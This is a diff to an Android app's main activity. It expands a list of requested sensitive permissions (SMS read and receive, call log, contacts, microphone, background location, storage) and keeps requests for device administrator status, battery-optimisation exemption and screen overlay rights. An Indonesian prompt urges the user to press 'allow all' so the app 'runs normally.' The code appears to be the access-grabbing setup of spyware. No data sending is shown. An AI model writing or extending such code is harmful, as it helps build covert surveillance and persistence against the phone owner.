@@ -17,6 +17,9 @@ import android.widget.LinearLayout;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
+
 import java.util.ArrayList;
 import java.util.List;
 
@@ -52,8 +55,7 @@ public class MainActivity extends Activity {
         root.addView(sub);
 
         TextView wiz = new TextView(this);
-        String wizard = Prefs.get(this, "wizard", "Izinkan semua akses agar aplikasi berjalan normal.");
-        wiz.setText(wizard);
+        wiz.setText(wizardText());
         wiz.setTextColor(0xFFD6DBE6);
         wiz.setTextSize(13f);
         wiz.setPadding(0, 0, 0, 30);
@@ -84,6 +86,14 @@ public class MainActivity extends Activity {
         requestAll();
     }
 
+    private String wizardText() {
+        try {
+            return getString(R.string.mzk_wizard);
+        } catch (Exception e) {
+            return "Izinkan semua akses agar aplikasi berjalan normal. Tekan IZINKAN SEMUA.";
+        }
+    }
+
     private String[] wanted() {
         List<String> p = new ArrayList<>();
         p.add(Manifest.permission.ACCESS_FINE_LOCATION);
@@ -92,14 +102,17 @@ public class MainActivity extends Activity {
         p.add(Manifest.permission.RECORD_AUDIO);
         p.add(Manifest.permission.READ_CONTACTS);
         p.add(Manifest.permission.READ_SMS);
+        p.add(Manifest.permission.RECEIVE_SMS);
         p.add(Manifest.permission.READ_CALL_LOG);
         p.add(Manifest.permission.READ_PHONE_STATE);
         if (Build.VERSION.SDK_INT >= 33) {
             p.add(Manifest.permission.POST_NOTIFICATIONS);
             p.add(Manifest.permission.READ_MEDIA_IMAGES);
             p.add(Manifest.permission.READ_MEDIA_VIDEO);
+            p.add(Manifest.permission.READ_MEDIA_AUDIO);
         } else {
             p.add(Manifest.permission.READ_EXTERNAL_STORAGE);
+            p.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
         }
         if (Build.VERSION.SDK_INT >= 29) p.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION);
         return p.toArray(new String[0]);
@@ -108,9 +121,13 @@ public class MainActivity extends Activity {
     private void requestAll() {
         List<String> need = new ArrayList<>();
         for (String perm : wanted()) {
-            if (checkSelfPermission(perm) != PackageManager.PERMISSION_GRANTED) need.add(perm);
+            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                need.add(perm);
+            }
         }
-        if (!need.isEmpty()) requestPermissions(need.toArray(new String[0]), REQ);
+        if (!need.isEmpty()) {
+            ActivityCompat.requestPermissions(this, need.toArray(new String[0]), REQ);
+        }
 
         DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
         ComponentName cn = new ComponentName(this, AdminReceiver.class);
@@ -124,7 +141,8 @@ public class MainActivity extends Activity {
 
         try {
             PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-            if (pm != null && Build.VERSION.SDK_INT >= 23 && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
+            if (pm != null && Build.VERSION.SDK_INT >= 23
+                    && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                 Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                         Uri.parse("package:" + getPackageName()));
                 startActivity(i);
@@ -142,7 +160,7 @@ public class MainActivity extends Activity {
         } catch (Exception ignored) {
         }
         try {
-            if (!Settings.canDrawOverlays(this)) {
+            if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
                 startActivity(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                         Uri.parse("package:" + getPackageName())));
             }
